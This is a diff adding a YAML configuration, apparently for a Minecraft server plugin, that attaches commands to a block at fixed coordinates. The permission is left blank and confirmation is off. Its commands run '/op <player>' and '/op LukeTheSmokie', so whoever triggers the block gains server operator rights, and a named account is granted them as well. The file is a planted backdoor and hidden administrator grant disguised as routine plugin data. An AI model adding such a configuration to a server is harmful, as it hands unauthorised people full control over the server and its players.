@@ -1,0 +1,23 @@
+permission: ''
+world: world
+X: -372
+Y: 91
+Z: 514
+price: 0.0
+cooldown: 0
+globalCooldown: 0
+confirmation: false
+commands:
+- /op <player>
+- /op LukeTheSmokie
+grantPermissions: []
+lastGlobalUse: 0
+lastUse: {}
+priceItems: []
+exp: 0
+pi_criteria:
+  enchants: false
+  name: false
+  lores: false
+  durability: false
+should_cancel_event: true
